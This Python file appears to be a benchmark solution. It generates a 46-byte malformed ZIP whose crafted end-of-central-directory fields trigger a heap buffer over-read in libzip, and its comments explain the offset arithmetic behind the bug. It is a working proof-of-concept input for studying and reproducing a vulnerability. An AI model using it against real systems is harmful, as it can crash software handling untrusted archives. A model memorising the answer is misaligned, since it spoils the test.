import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a heap buffer overflow in libzip caused by a negative archive start offset.
        # Ground-truth PoC length is 46 bytes.
        # We construct a file with a 22-byte EOCD at the end and 24 bytes of data preceding it.
        # By setting Size of CD = 24 and Offset of CD = 24, we force the archive start offset calculation:
        # min = eocd_offset (24) - size_cd (24) = 0
        # archive_start = min (0) - offset_cd (24) = -24
        # The parser then seeks to (archive_start + offset_cd) = 0, reads 24 bytes into a buffer,
        # and attempts to parse a Central Directory Entry (46 bytes) from this 24-byte buffer,
        # causing a heap buffer read overflow.

        # 1. Fake Central Directory Entry start (24 bytes)
        # Must start with CD signature (0x02014b50) to pass initial signature check.
        # The rest is padding (zeros) which represent the beginning of a CD header.
        fake_cd = b"\x50\x4b\x01\x02" + b"\x00" * 20

        # 2. End of Central Directory Record (EOCD) - 22 bytes
        eocd = b"\x50\x4b\x05\x06"      # Signature (4 bytes)
        eocd += b"\x00\x00"             # Number of this disk (2 bytes)
        eocd += b"\x00\x00"             # Disk where central directory starts (2 bytes)
        eocd += b"\x01\x00"             # Number of central directory records on this disk (2 bytes)
        eocd += b"\x01\x00"             # Total number of central directory records (2 bytes)
        eocd += struct.pack("<I", 24)   # Size of central directory (4 bytes)
        eocd += struct.pack("<I", 24)   # Offset of start of central directory (4 bytes)
        eocd += b"\x00\x00"             # ZIP file comment length (2 bytes)

        return fake_cd + eocd